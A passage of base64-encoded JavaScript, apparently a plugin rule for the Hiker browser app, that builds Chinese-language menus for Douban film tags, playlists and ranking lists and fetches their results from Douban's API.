6IHRlbXAuZmlsdGVyID09PSBmaWx0ZXJbcl0gPyAn4oCc4oCc4oCd4oCdPGI+IDxmb250IGNvbG9yPScgKyBjb2xvciArICc+JyArIHIgKyAnIDwvZm9udD48L2I+JyA6IHIsXFxcXHJcXFxcbiAgICAgICAgICAgIGNvbF90eXBlOiAnc2Nyb2xsX2J1dHRvbicsXFxcXHJcXFxcbiAgICAgICAgICAgIHVybDogJCgnaGlrZXI6IC8vZW1wdHkjbm9Mb2FkaW5nIycpLmxhenlSdWxlKChlKSA9PiB7XFxcXHJcXFxcbiAgICAgICAgICAgICAgICBsZXQgdGVtcCA9IEpTT04ucGFyc2UoZ2V0TXlWYXIoJ2NsYXNzbGlzdCcpKTtcXFxcclxcXFxuICAgICAgICAgICAgICAgIHRlbXAuZmlsdGVyID0gZTtcXFxcclxcXFxuICAgICAgICAgICAgICAgIHB1dE15VmFyKFxcXFxcXFwiY2xhc3NsaXN0XFxcXFxcXCIsIEpTT04uc3RyaW5naWZ5KHRlbXApKTtcXFxcclxcXFxuICAgICAgICAgICAgICAgIHJlZnJlc2hQYWdlKCk7XFxcXHJcXFxcbiAgICAgICAgICAgICAgICByZXR1cm4gJ2hpa2VyOi8vZW1wdHknXFxcXHJcXFxcbiAgICAgICAgICAgIH0sIGZpbHRlcltyXSlcXFxcclxcXFxuICAgICAgICB9KVxcXFxyXFxcXG4gICAgfVxcXFxyXFxcXG5cXFxcclxcXFxuICAgIGEucHVzaCh7XFxcXHJcXFxcbiAgICAgICAgdGl0bGU6ICfigJzigJzigJ3igJ08Yj4gPGZvbnQgY29sb3I9JyArIGNvbG9yICsgJz7or4TliIbljLrpl7Q6JyArIHRlbXAuc2NvcmUucmVwbGFjZSgnLCcsICctJykgKyAnIDwvZm9udD48L2I+JyxcXFxcclxcXFxuICAgICAgICBjb2xfdHlwZTogJ3Njcm9sbF9idXR0b24nLFxcXFxyXFxcXG4gICAgICAgIHVybDogJCh0ZW1wLnNjb3JlLnJlcGxhY2UoJywnLCAnLScpLCAn6K+E5YiG5bqU5ZyoMC0xMOS5i+mXtCcpLmlucHV0KCgpID0+IHtcXFxcclxcXFxuICAgICAgICAgICAgbGV0IHRlbXAgPSBKU09OLnBhcnNlKGdldE15VmFyKCdjbGFzc2xpc3QnKSk7XFxcXHJcXFxcbiAgICAgICAgICAgIGxldCBpbnB1dHMgPSBpbnB1dC5zcGxpdCgnLScpO1xcXFxyXFxcXG4gICAgICAgICAgICBpZiAoaW5wdXRzLmxlbmd0aCA9PSAyICYmIGlucHV0cy5ldmVyeShlID0+IGUgPj0gMCAmJiBlIDw9IDEwKSAmJiBwYXJzZUZsb2F0KGlucHV0c1swXSkgPCBpbnB1dHNbMV0pIHtcXFxcclxcXFxuICAgICAgICAgICAgICAgIHRlbXAuc2NvcmUgPSBpbnB1dC5yZXBsYWNlKCctJywgJywnKTtcXFxcclxcXFxuICAgICAgICAgICAgICAgIHB1dE15VmFyKFxcXFxcXFwiY2xhc3NsaXN0XFxcXFxcXCIsIEpTT04uc3RyaW5naWZ5KHRlbXApKTtcXFxcclxcXFxuICAgICAgICAgICAgICAgIHJlZnJlc2hQYWdlKCk7XFxcXHJcXFxcbiAgICAgICAgICAgICAgICByZXR1cm4gJ2hpa2VyOi8vZW1wdHknXFxcXHJcXFxcbiAgICAgICAgICAgIH0gZWxzZSB7XFxcXHJcXFxcbiAgICAgICAgICAgICAgICByZXR1cm4gJ3RvYXN0Oi8v6K+35q2j56Gu6L6T5YWlJ1xcXFxyXFxcXG4gICAgICAgICAgICB9XFxcXHJcXFxcbiAgICAgICAgfSlcXFxcclxcXFxuICAgIH0pXFxcXHJcXFxcblxcXFxyXFxcXG4gICAgbGV0IHMgPSBnZXREb3ViYW5SZXMoXFxcXFxcXCJodHRwczovL2Zyb2RvLmRvdWJhbi5jb20vYXBpL3YyL21vdmllL3RhZz9cXFxcXFxcIlxcXFxyXFxcXG4gICAgICAgICAgICArIChwYWdlID8gXFxcXFxcXCJzdGFydD1cXFxcXFxcIiArIChwYWdlIC0gMSkgKiBjb3VudFxcXFxyXFxcXG4gICAgICAgICAgICArIFxcXFxcXFwiJmNvdW50PVxcXFxcXFwiICsgY291bnQgOiBcXFxcXFxcInN0YXJ0PTAmY291bnQ9MzBcXFxcXFxcIilcXFxcclxcXFxuICAgICAgICAgICAgKyBcXFxcXFxcIiZxPVxcXFxcXFwiICsgdGVtcC5zdWJ0eXBlXFxcXHJcXFxcbiAgICAgICAgICAgICsgXFxcXFxcXCIsXFxcXFxcXCIgKyAodGVtcC5sb2NhbD09XFxcXFxcXCLoh6rlrprkuYnlnLDljLpcXFxcXFxcIiA/IHRlbXAuY3VzdG9tTG9jYWwgOiB0ZW1wLmxvY2FsKVxcXFxyXFxcXG4gICAgICAgICAgICArIFxcXFxcXFwiLFxcXFxcXFwiICsgKHRlbXAudHlwZT09XFxcXFxcXCLoh6rlrprkuYnnsbvlnotcXFxcXFxcIiA/IHRlbXAuY3VzdG9tVHlwZSA6IHRlbXAudHlwZSlcXFxcclxcXFxuICAgICAgICAgICAgKyBcXFxcXFxcIixcXFxcXFxcIiArICh0ZW1wLnllYXI9PVxcXFxcXFwi6Ieq5a6a5LmJ5bm05Lu9XFxcXFxcXCIgPyB0ZW1wLmN1c3RvbVllYXIgOiB0ZW1wLnllYXIpXFxcXHJcXFxcbiAgICAgICAgICAgICsgXFxcXFxcXCIsXFxcXFxcXCIgKyAodGVtcC5jbGFzcz09XFxcXFxcXCLoh6rlrprkuYnmoIfnrb5cXFxcXFxcIiA/IHRlbXAuY3VzdG9tQ2xhc3MgOiB0ZW1wLmNsYXNzKVxcXFxyXFxcXG4gICAgICAgICAgICArIFxcXFxcXFwiJnNvcnQ9XFxcXFxcXCIgKyB0ZW1wLnJhbmsgKyBcXFxcXFxcIiZzY29yZV9yYW5nZT1cXFxcXFxcIiArIHRlbXAuc2NvcmUgKyAnJmZpbHRlcj0nICsgdGVtcC5maWx0ZXIpO1xcXFxyXFxcXG4gICAgbGV0IGwgPSBzLmRhdGE7XFxcXHJcXFxcblxcXFxyXFxcXG4gICAgbGV0IGRldGFpbHNWaWV3Q29uZmlncyA9IGdldENvbmZpZygnZGV0YWlsc1ZpZXdDb25maWdzJyk7XFxcXHJcXFxcbiAgICBsZXQgaSA9IGwubWFwKChlID0+IHtcXFxcclxcXFxuICAgICAgICBsZXQgdHlwZSA9IGUudHlwZSxcXFxcclxcXFxuICAgICAgICAgICAgaWQgPSBlLmlkLFxcXFxyXFxcXG4gICAgICAgICAgICB0aXRsZSA9IGUudGl0bGU7XFxcXHJcXFxcbiAgICAgICAgbGV0IHVzZUNvbmZpZyA9IGRldGFpbHNWaWV3Q29uZmlnc1tkZXRhaWxzVmlld0NvbmZpZ3MudXNlXS5jb25maWc7XFxcXHJcXFxcbiAgICAgICAgbGV0IHVybFBhcmFtcyA9IHt9O1xcXFxyXFxcXG4gICAgICAgIGlmICh1c2VDb25maWcuc3RhcnRzV2l0aCgneycpKSB7XFxcXHJcXFxcbiAgICAgICAgICAgIGV2YWwoJ3VybFBhcmFtcyA9ICcgKyB1c2VDb25maWcpO1xcXFxyXFxcXG4gICAgICAgIH0gZWxzZSB7XFxcXHJcXFxcbiAgICAgICAgICAgIHVybFBhcmFtcy51cmwgPSAkKFxcXFxcXFwiaGlrZXI6Ly9lbXB0eSNub0hpc3RvcnkjI2ltbWVyc2l2ZVRoZW1lI1xcXFxcXFwiICsgJz90eXBlPScgKyB0eXBlICsgJyZpZD0nICsgaWQpLnJ1bGUoKHR5cGUsIGlkLCB0aXRsZSwgdXNlQ29uZmlnKSA9PiB7XFxcXHJcXFxcbiAgICAgICAgICAgICAgICBldmFsKEpTT04ucGFyc2UocmVxdWVzdCgnaGlrZXI6Ly9wYWdlL21haW4nKSkucnVsZSk7XFxcXHJcXFxcbiAgICAgICAgICAgICAgICBpZiAodHlwZSA9PT0gXFxcXFxcXCJwbGF5bGlzdFxcXFxcXFwiKSB7XFxcXHJcXFxcbiAgICAgICAgICAgICAgICAgICAgZG91TGlzdChpZCwgTVlfUEFHRSwgNTApO1xcXFxyXFxcXG4gICAgICAgICAgICAgICAgfSBlbHNlIHtcXFxcclxcXFxuICAgICAgICAgICAgICAgICAgICBldmFsKHVzZUNvbmZpZyk7XFxcXHJcXFxcbiAgICAgICAgICAgICAgICB9XFxcXHJcXFxcbiAgICAgICAgICAgIH0sIHR5cGUsIGlkLCB0aXRsZSwgdXNlQ29uZmlnKTtcXFxcclxcXFxuICAgICAgICB9XFxcXHJcXFxcbiAgICAgICAgcmV0dXJuIHtcXFxcclxcXFxuICAgICAgICAgICAgdGl0bGU6IHRpdGxlLFxcXFxyXFxcXG4gICAgICAgICAgICBjb2xfdHlwZTogJ21vdmllXzMnLFxcXFxyXFxcXG4gICAgICAgICAgICB1cmw6IHVybFBhcmFtcy51cmwsXFxcXHJcXFxcbiAgICAgICAgICAgIGV4dHJhOiB1cmxQYXJhbXMuZXh0cmEsXFxcXHJcXFxcbiAgICAgICAgICAgIGltZzogZS5jb3Zlcl91cmwgKyBcXFxcXFxcIkBSZWZlcmVyPVxcXFxcXFwiICsgZS5jb3Zlcl91cmwsXFxcXHJcXFxcbiAgICAgICAgICAgIGRlc2M6IGUubnVsbF9yYXRpbmdfcmVhc29uIHx8IGUucmF0aW5nLnZhbHVlXFxcXHJcXFxcbiAgICAgICAgfVxcXFxyXFxcXG4gICAgfSkpO1xcXFxyXFxcXG5cXFxcclxcXFxuICAgIHJldHVybiBwYWdlID4gMSA/IGkgOiBhLmNvbmNhdChpKTtcXFxcclxcXFxufVxcXFxyXFxcXG5cXFxcclxcXFxuLy/niYfljZVcXFxcclxcXFxuZnVuY3Rpb24gcGxheUxpc3QocGFnZSwgY291bnQpIHtcXFxcclxcXFxuICAgIGlmICghZ2V0TXlWYXIoJ3BsYXlsaXN0JykpIHB1dE15VmFyKCdwbGF5bGlzdCcsICd7XFxcXFxcXCJzdWJ0eXBlXFxcXFxcXCI6XFxcXFxcXCJcXFxcXFxcIixcXFxcXFxcInR5cGVcXFxcXFxcIjpcXFxcXFxcImFsbFxcXFxcXFwifScpO1xcXFxyXFxcXG4gICAgbGV0IGEgPSBbXTtcXFxcclxcXFxuICAgIGxldCB0ZW1wID0gSlNPTi5wYXJzZShnZXRNeVZhcigncGxheWxpc3QnLCAne1xcXFxcXFwic3VidHlwZVxcXFxcXFwiOlxcXFxcXFwiXFxcXFxcXCIsXFxcXFxcXCJ0eXBlXFxcXFxcXCI6XFxcXFxcXCJhbGxcXFxcXFxcIn0nKSk7XFxcXHJcXFxcbiAgICBsZXQgY29sb3IgPSBnZXRDb25maWcoJ2Nob29zZUNvbG9yJyk7XFxcXHJcXFxcblxcXFxyXFxcXG4gICAgbGV0IGl0ZW1zID0ge1xcXFxyXFxcXG4gICAgICAgIHR5cGU6IHtcXFxcclxcXFxuICAgICAgICAgICAg5YWo6YOoOiBcXFxcXFxcImFsbFxcXFxcXFwiLFxcXFxyXFxcXG4gICAgICAgICAgICDosYbnk6PniYfljZU6IFxcXFxcXFwib2ZmaWNpYWxcXFxcXFxcIixcXFxcclxcXFxuICAgICAgICAgICAg57K+6YCJOiBcXFxcXFxcInNlbGVjdGVkXFxcXFxcXCIsXFxcXHJcXFxcbiAgICAgICAgICAgIOe7j+WFuDogXFxcXFxcXCJjbGFzc2ljYWxcXFxcXFxcIixcXFxcclxcXFxuICAgICAgICAgICAg6I635aWWOiBcXFxcXFxcInByaXplXFxcXFxcXCIsXFxcXHJcXFxcbiAgICAgICAgICAgIOmrmOWIhjogXFxcXFxcXCJoaWdoX3Njb3JlXFxcXFxcXCIsXFxcXHJcXFxcbiAgICAgICAgICAgIOamnOWNlTogXFxcXFxcXCJtb3ZpZV9saXN0XFxcXFxcXCIsXFxcXHJcXFxcbiAgICAgICAgICAgIOWGt+mXqOS9s+eJhzogXFxcXFxcXCJkYXJrX2hvcnNlXFxcXFxcXCIsXFxcXHJcXFxcbiAgICAgICAgICAgIOS4u+mimDogXFxcXFxcXCJ0b3BpY1xcXFxcXFwiLFxcXFxyXFxcXG4gICAgICAgICAgICDlr7zmvJQ6IFxcXFxcXFwiZGlyZWN0b3JcXFxcXFxcIixcXFxcclxcXFxuICAgICAgICAgICAg5ryU5ZGYOiBcXFxcXFxcImFjdG9yXFxcXFxcXCIsXFxcXHJcXFxcbiAgICAgICAgICAgIOezu+WIlzogXFxcXFxcXCJzZXJpZXNcXFxcXFxcIixcXFxcclxcXFxuICAgICAgICAgICAg5Y2O6K+tOiBcXFxcXFxcImNoaW5lc2VcXFxcXFxcIixcXFxcclxcXFxuICAgICAgICAgICAg5qyn576OOiBcXFxcXFxcIndlc3Rlcm5cXFxcXFxcIixcXFxcclxcXFxuICAgICAgICAgICAg5pel5pysOiBcXFxcXFxcImphcGFuZXNlXFxcXFxcXCIsXFxcXHJcXFxcbiAgICAgICAgICAgIOmfqeWbvTogXFxcXFxcXCJrb3JlYVxcXFxcXFwiLFxcXFxyXFxcXG4gICAgICAgICAgICDllpzliac6IFxcXFxcXFwiY29tZWR5XFxcXFxcXCIsXFxcXHJcXFxcbiAgICAgICAgICAgIOWKqOS9nDogXFxcXFxcXCJhY3Rpb25cXFxcXFxcIixcXFxcclxcXFxuICAgICAgICAgICAg54ix5oOFOiBcXFxcXFxcImxvdmVcXFxcXFxcIixcXFxcclxcXFxuICAgICAgICAgICAg56eR5bm7OiBcXFxcXFxcInNjaWVuY2VfZmljdGlvblxcXFxcXFwiLFxcXFxyXFxcXG4gICAgICAgICAgICDliqjnlLs6IFxcXFxcXFwiY2FydG9vblxcXFxcXFwiLFxcXFxyXFxcXG4gICAgICAgICAgICDmgqznlpE6IFxcXFxcXFwibXlzdGVyeVxcXFxcXFwiLFxcXFxyXFxcXG4gICAgICAgICAgICDmg4rmgpo6IFxcXFxcXFwicGFuaWNcXFxcXFxcIixcXFxcclxcXFxuICAgICAgICAgICAg5oGQ5oCWOiBcXFxcXFxcImhvcnJpYmxlXFxcXFxcXCIsXFxcXHJcXFxcbiAgICAgICAgICAgIOeKr+e9qjogXFxcXFxcXCJjcmltaW5hbFxcXFxcXFwiLFxcXFxyXFxcXG4gICAgICAgICAgICDlkIzmgKc6IFxcXFxcXFwibGdidFxcXFxcXFwiLFxcXFxyXFxcXG4gICAgICAgICAgICDmiJjkuok6IFxcXFxcXFwid2FyXFxcXFxcXCIsXFxcXHJcXFxcbiAgICAgICAgICAgIOWlh+W5uzogXFxcXFxcXCJmYW50YXN5XFxcXFxcXCIsXFxcXHJcXFxcbiAgICAgICAgICAgIFxcXFxcXFwiXFxcXFxcXFx1NjBjNVxcXFxcXFxcdTgyNzJcXFxcXFxcIjogXFxcXFxcXCJlcm90aWNhXFxcXFxcXCIsXFxcXHJcXFxcbiAgICAgICAgICAgIOmfs+S5kDogXFxcXFxcXCJtdXNpY1xcXFxcXFwiLFxcXFxyXFxcXG4gICAgICAgICAgICDnuqrlvZXniYc6IFxcXFxcXFwiZG9jdW1lbnRhcnlcXFxcXFxcIixcXFxcclxcXFxuICAgICAgICAgICAg5rK75oSIOiBcXFxcXFxcImN1cmVcXFxcXFxcIixcXFxcclxcXFxuICAgICAgICAgICAg6Im65pyvOiBcXFxcXFxcImFydFxcXFxcXFwiLFxcXFxyXFxcXG4gICAgICAgICAgICDpu5HoibLlub3pu5g6IFxcXFxcXFwiZGFya19odW1vclxcXFxcXFwiLFxcXFxyXFxcXG4gICAgICAgICAgICDpnZLmmKU6IFxcXFxcXFwieW91dGhcXFxcXFxcIixcXFxcclxcXFxuICAgICAgICAgICAg5aWz5oCnOiBcXFxcXFxcImZlbWFsZVxcXFxcXFwiLFxcXFxyXFxcXG4gICAgICAgICAgICDnnJ/lrp7kuovku7bmlLnnvJY6IFxcXFxcXFwicmVhbF9ldmVudFxcXFxcXFwiLFxcXFxyXFxcXG4gICAgICAgICAgICDmmrTlips6IFxcXFxcXFwidmlvbGVuY2VcXFxcXFxcIixcXFxcclxcXFxuICAgICAgICAgICAg6buR55m9OiBcXFxcXFxcImJsYWNrX3doaXRlXFxcXFxcXCIsXFxcXHJcXFxcbiAgICAgICAgICAgIOe+jumjnzogXFxcXFxcXCJmb29kXFxcXFxcXCIsXFxcXHJcXFxcbiAgICAgICAgICAgIOaXheihjDogXFxcXFxcXCJ0cmF2ZWxcXFxcXFxcIixcXFxcclxcXFxuICAgICAgICAgICAg5YS/56ulOiBcXFxcXFxcImNoaWxkXFxcXFxcXCIsXFxcXHJcXFxcbiAgICAgICAgICAgIOS6uuaApzogXFxcXFxcXCJodW1hbml0eVxcXFxcXFwiLFxcXFxyXFxcXG4gICAgICAgICAgICDlrrbluq06IFxcXFxcXFwiZmFtaWx5XFxcXFxcXCIsXFxcXHJcXFxcbiAgICAgICAgICAgIOaWh+iJujogXFxcXFxcXCJsaXRlcmFyeV9hcnRcXFxcXFxcIixcXFxcclxcXFxuICAgICAgICAgICAg5bCP6K+05pS557yWOiBcXFxcXFxcIm5vdmVsXFxcXFxcXCIsXFxcXHJcXFxcbiAgICAgICAgICAgIOaEn+S6ujogXFxcXFxcXCJtb3ZpbmdcXFxcXFxcIixcXFxcclxcXFxuICAgICAgICAgICAg5Yqx5b+XOiBcXFxcXFxcImluc3BpcmF0aW9uXFxcXFxcXCJcXFxcclxcXFxuICAgICAgICB9LFxcXFxyXFxcXG4gICAgICAgIHN1YnR5cGU6IHtcXFxcclxcXFxuICAgICAgICAgICAg5YWo6YOoOiBcXFxcXFxcIlxcXFxcXFwiLFxcXFxyXFxcXG4gICAgICAgICAgICDnlLXlvbE6IFxcXFxcXFwibW92aWVcXFxcXFxcIixcXFxcclxcXFxuICAgICAgICAgICAg55S16KeG5YmnOiBcXFxcXFxcInR2XFxcXFxcXCJcXFxcclxcXFxuICAgICAgICB9XFxcXHJcXFxcbiAgICB9XFxcXHJcXFxcbiAgICBmb3IgKGxldCBpIGluIGl0ZW1zKSB7XFxcXHJcXFxcbiAgICAgICAgZm9yIChsZXQgaiBpbiBpdGVtc1tpXSkge1xcXFxyXFxcXG4gICAgICAgICAgICBhLnB1c2goe1xcXFxyXFxcXG4gICAgICAgICAgICAgICAgdGl0bGU6IHRlbXBbaV0gPT09IGl0ZW1zW2ldW2pdID8gJ+KAnOKAnOKAneKAnTxiPiA8Zm9udCBjb2xvcj0nICsgY29sb3IgKyAnPicgKyBqICsgJyA8L2ZvbnQ+PC9iPicgOiBqLFxcXFxyXFxcXG4gICAgICAgICAgICAgICAgY29sX3R5cGU6ICdzY3JvbGxfYnV0dG9uJyxcXFxcclxcXFxuICAgICAgICAgICAgICAgIHVybDogJCgnaGlrZXI6Ly9lbXB0eSNub0xvYWRpbmcjJykubGF6eVJ1bGUoKHQpID0+IHtcXFxcclxcXFxuICAgICAgICAgICAgICAgICAgICBsZXQgdGVtcCA9IEpTT04ucGFyc2UoZ2V0TXlWYXIoJ3BsYXlsaXN0JywgJ3tcXFxcXFxcInN1YnR5cGVcXFxcXFxcIjpcXFxcXFxcIlxcXFxcXFwiLFxcXFxcXFwidHlwZVxcXFxcXFwiOlxcXFxcXFwiYWxsXFxcXFxcXCJ9JykpO1xcXFxyXFxcXG4gICAgICAgICAgICAgICAgICAgIHRlbXBbdFswXV0gPSB0WzFdO1xcXFxyXFxcXG4gICAgICAgICAgICAgICAgICAgIHB1dE15VmFyKFxcXFxcXFwicGxheWxpc3RcXFxcXFxcIiwgSlNPTi5zdHJpbmdpZnkodGVtcCkpO1xcXFxyXFxcXG4gICAgICAgICAgICAgICAgICAgIHJlZnJlc2hQYWdlKCk7XFxcXHJcXFxcbiAgICAgICAgICAgICAgICAgICAgcmV0dXJuICdoaWtlcjovL2VtcHR5J1xcXFxyXFxcXG4gICAgICAgICAgICAgICAgfSwgW2ksIGl0ZW1zW2ldW2pdXSlcXFxcclxcXFxuICAgICAgICAgICAgfSlcXFxcclxcXFxuICAgICAgICB9XFxcXHJcXFxcbiAgICAgICAgYS5wdXNoKHtcXFxcclxcXFxuICAgICAgICAgICAgY29sX3R5cGU6IFxcXFxcXFwiYmxhbmtfYmxvY2tcXFxcXFxcIlxcXFxyXFxcXG4gICAgICAgIH0pXFxcXHJcXFxcbiAgICB9XFxcXHJcXFxcblxcXFxyXFxcXG4gICAgbGV0IHMgPSBnZXREb3ViYW5SZXMoXFxcXFxcXCJodHRwczovL2Zyb2RvLmRvdWJhbi5jb20vYXBpL3YyL3NreW5ldC9uZXdfcGxheWxpc3RzXFxcXFxcXCIgKyBcXFxcXFxcIj9jYXRlZ29yeT1cXFxcXFxcIiArIHRlbXAudHlwZSArIFxcXFxcXFwiJnN1YmplY3RfdHlwZT1cXFxcXFxcIiArIHRlbXAuc3VidHlwZSArIChwYWdlID8gXFxcXFxcXCImc3RhcnQ9XFxcXFxcXCIgKyAocGFnZSAtIDEpICogY291bnQgKyBcXFxcXFxcIiZjb3VudD1cXFxcXFxcIiArIGNvdW50IDogXFxcXFxcXCImc3RhcnQ9MCZjb3VudD0xMFxcXFxcXFwiKSk7XFxcXHJcXFxcbiAgICBsZXQgbCA9IHMuZGF0YVswXS5pdGVtcztcXFxcclxcXFxuXFxcXHJcXFxcbiAgICBsZXQgaSA9IGwubWFwKChlID0+ICh7XFxcXHJcXFxcbiAgICAgICAgdGl0bGU6IGUudGl0bGUsXFxcXHJcXFxcbiAgICAgICAgdXJsOiAkKCdoaWtlcjovL2VtcHR5LyRwYWdle2Z5cGFnZX0jbm9IaXN0b3J5IycpLnJ1bGUoKHR5cGUsIGlkKSA9PiB7XFxcXHJcXFxcbiAgICAgICAgICAgIGV2YWwoSlNPTi5wYXJzZShyZXF1ZXN0KCdoaWtlcjovL3BhZ2UvbWFpbicpKS5ydWxlKTtcXFxcclxcXFxuICAgICAgICAgICAgaWYgKHR5cGUgPT09IFxcXFxcXFwicGxheWxpc3RcXFxcXFxcIikge1xcXFxyXFxcXG4gICAgICAgICAgICAgICAgZG91TGlzdChpZCwgTVlfUEFHRSwgNTApO1xcXFxyXFxcXG4gICAgICAgICAgICB9IGVsc2Uge1xcXFxyXFxcXG4gICAgICAgICAgICAgICAgc3ViamVjdENvbGxlY3Rpb25MaXN0KE1ZX1BBR0UsIDUwLCBpZCk7XFxcXHJcXFxcbiAgICAgICAgICAgIH1cXFxcclxcXFxuICAgICAgICB9LCBlLnR5cGUsIGUuaWQpLFxcXFxyXFxcXG4gICAgICAgIGltZzogZS5jb3Zlcl91cmwgKyBcXFxcXFxcIkBSZWZlcmVyPVxcXFxcXFwiICsgZS5jb3Zlcl91cmwsXFxcXHJcXFxcbiAgICAgICAgZGVzYzogXFxcXFxcXCLlhbFcXFxcXFxcIiArIGUuaXRlbXNfY291bnQgKyBcXFxcXFxcIumDqFxcXFxcXFwiXFxcXHJcXFxcbiAgICB9KSkpO1xcXFxyXFxcXG5cXFxcclxcXFxuICAgIHJldHVybiBwYWdlID4gMSA/IGkgOiBhLmNvbmNhdChpKTtcXFxcclxcXFxufVxcXFxyXFxcXG5cXFxcclxcXFxuLy/mppzljZVcXFxcclxcXFxuZnVuY3Rpb24gcmFua0xpc3QocGFnZSwgY291bnQpIHtcXFxcclxcXFxuICAgIGlmICghZ2V0TXlWYXIoJ3JhbmtMaXN0JykpIHB1dE15VmFyKCdyYW5rTGlzdCcsICd7XFxcXFxcXCJ0eXBlXFxcXFxcXCI6XFxcXFxcXCJtb3ZpZVxcXFxcXFwiLFxcXFxcXFwibGlzdFxcXFxcXFwiOlxcXFxcXFwicmFua19saXN0XFxcXFxcXCIsXFxcXFxcXCJ5ZWFyX2xpc3RzXFxcXFxcXCI6W10sXFxcXFxcXCJjYXRlZ29yeV9saXN0c1xcXFxcXFwiOltdLFxcXFxcXFwieWVhclxcXFxcXFwiOlxcXFxcXFwiXFxcXFxcXCIsXFxcXFxcXCJjYXRlZ29yeVxcXFxcXFwiOlxcXFxcXFwiXFxcXFxcXCJ9Jyk7XFxcXHJcXFxcbiAgICBsZXQgYSA9IFtdO1xcXFxyXFxcXG4gICAgbGV0IHRlbXAgPSBKU09OLnBhcnNlKGdldE15VmFyKCdyYW5rTGlzdCcpKTtcXFxcclxcXFxuICAgIGxldCBjb2xvciA9IGdldENvbmZpZygnY2hvb3NlQ29sb3InKTtcXFxcclxcXFxuXFxcXHJcXFxcbiAgICBsZXQgaXRlbXMgPSB7XFxcXHJcXFxcbiAgICAgICAg55S15b2xOiAnbW92aWUnLFxcXFxyXFxcXG4gICAgICAgIOeUteinhuWJpzogJ3R2J1xcXFxyXFxcXG4gICAgfVxcXFxyXFxcXG4gICAgZm9yIChsZXQgaSBpbiBpdGVtcykge1xcXFxyXFxcXG4gICAgICAgIGEucHVzaCh7XFxcXHJcXFxcbiAgICAgICAgICAgIHRpdGxlOiB0ZW1wLnR5cGUgPT0gaXRlbXNbaV0gPyAn4oCc4oCc4oCd4oCdPGI+IDxmb250IGNvbG9yPScgKyBjb2xvciArICc+JyArIGkgKyAnIDwvZm9udD48L2I+JyA6IGksXFxcXHJcXFxcbiAgICAgICAgICAgIGNvbF90eXBlOiAnc2Nyb2xsX2J1dHRvbicsXFxcXHJcXFxcbiAgICAgICAgICAgIHVybDogJCgnaGlrZXI6Ly9lbXB0eSNub0xvYWRpbmcjJykubGF6eVJ1bGUoKGUpID0+IHtcXFxcclxcXFxuICAgICAgICAgICAgICAgIGxldCB0ZW1wID0gSlNPTi5wYXJzZShnZXRNeVZhcigncmFua0xpc3QnKSk7XFxcXHJcXFxcbiAgICAgICAgICAgICAgICB0ZW1wLnR5cGUgPSBlO1xcXFxyXFxcXG4gICAgICAgICAgICAgICAgcHV0TXlWYXIoXFxcXFxcXCJyYW5rTGlzdFxcXFxcXFwiLCBKU09OLnN0cmluZ2lmeSh0ZW1wKSk7XFxcXHJcXFxcbiAgICAgICAgICAgICAgICByZWZyZXNoUGFnZSgpO1xcXFxyXFxcXG4gICAgICAgICAgICAgICAgcmV0dXJuICdoaWtlcjovL2VtcHR5J1xcXFxyXFxcXG4gICAgICAgICAgICB9LCBpdGVtc1tpXSlcXFxcclxcXFxuICAgICAgICB9KVxcXFxyXFxcXG4gICAgfVxcXFxyXFxcXG5cXFxcclxcXFxuICAgIGEucHVzaCh7XFxcXHJcXFxcbiAgICAgICAgY29sX3R5cGU6IFxcXFxcXFwiYmxhbmtfYmxvY2tcXFxcXFxcIlxcXFxyXFxcXG4gICAgfSlcXFxcclxcXFxuXFxcXHJcXFxcbiAgICBsZXQgbGlzdCA9IHtcXFxcclxcXFxuICAgICAgICDlj6PnopHmppzljZU6ICdyYW5rX2xpc3QnLFxcXFxyXFxcXG4gICAgICAgIOW5tOW6puamnOWNlTogJ3llYXJfcmFua3MnLFxcXFxyXFxcXG4gICAgICAgIOexu+Wei+amnOWNlTogJ2NhdGVnb3J5X3JhbmtzJ1xcXFxyXFxcXG4gICAgfVxcXFxyXFxcXG4gICAgZm9yIChsZXQgaSBpbiBsaXN0KSB7XFxcXHJcXFxcbiAgICAgICAgYS5wdXNoKHtcXFxcclxcXFxuICAgICAgICAgICAgdGl0bGU6IHRlbXAubGlzdCA9PSBsaXN0W2ldID8gJ+KAnOKAnOKAneKAnTxiPiA8Zm9udCBjb2xvcj0nICsgY29sb3IgKyAnPicgKyBpICsgJyA8L2ZvbnQ+PC9iPicgOiBpLFxcXFxyXFxcXG4gICAgICAgICAgICBjb2xfdHlwZTogJ3Njcm9sbF9idXR0b24nLFxcXFxyXFxcXG4gICAgICAgICAgICB1cmw6ICQoJ2hpa2VyOi8vZW1wdHkjbm9Mb2FkaW5nIycpLmxhenlSdWxlKChlKSA9PiB7XFxcXHJcXFxcbiAgICAgICAgICAgICAgICBsZXQgdGVtcCA9IEpTT04ucGFyc2UoZ2V0TXlWYXIoJ3JhbmtMaXN0JykpO1xcXFxyXFxcXG4gICAgICAgICAgICAgICAgdGVtcC5saXN0ID0gZTtcXFxcclxcXFxuICAgICAgICAgICAgICAgIHB1dE15VmFyKFxcXFxcXFwicmFua0xpc3RcXFxcXFxcIiwgSlNPTi5zdHJpbmdpZnkodGVtcCkpO1xcXFxyXFxcXG4gICAgICAgICAgICAgICAgcmVmcmVzaFBhZ2UoKTtcXFxcclxcXFxuICAgICAgICAgICAgICAgIHJldHVybiAnaGlrZXI6Ly9lbXB0eSdcXFxcclxcXFxuICAgICAgICAgICAgfSwgbGlzdFtpXSlcXFxcclxcXFxuICAgICAgICB9KVxcXFxyXFxcXG4gICAgfVxcXFxyXFxcXG5cXFxcclxcXFxuICAgIGlmICh0ZW1wLmxpc3QgPT0gJ3llYXJfcmFua3MnICYmIHRlbXAueWVhcl9saXN0cy5sZW5ndGggPT0gMCkge1xcXFxyXFxcXG4gICAgICAgIGxldCB0ID0gZ2V0RG91YmFuUmVzKFxcXFxcXFwiaHR0cHM6Ly9mcm9kby5kb3ViYW4uY29tL2FwaS92Mi9cXFxcXFxcIiArIHRlbXAudHlwZSArICcvcmFua19saXN0Jyk7XFxcXHJcXFxcbiAgICAgICAgdGVtcC55ZWFyX2xpc3RzID0gdC5ncm91cHNbMV0udGFicztcXFxcclxcXFxuICAgICAgICBwdXRNeVZhcigncmFua0xpc3QnLCBKU09OLnN0cmluZ2lmeSh0ZW1wKSk7XFxcXHJcXFxcbiAgICB9IGVsc2UgaWYgKHRlbXAubGlzdCA9PSAnY2F0ZWdvcnlfcmFua3MnICYmIHRlbXAuY2F0ZWdvcnlfbGlzdHMubGVuZ3RoID09IDApIHtcXFxcclxcXFxuICAgICAgICBsZXQgdCA9IGdldERvdWJhblJlcyhcXFxcXFxcImh0dHBzOi8vZnJvZG8uZG91YmFuLmNvbS9hcGkvdjIvXFxcXFxcXCIgKyB0ZW1wLnR5cGUg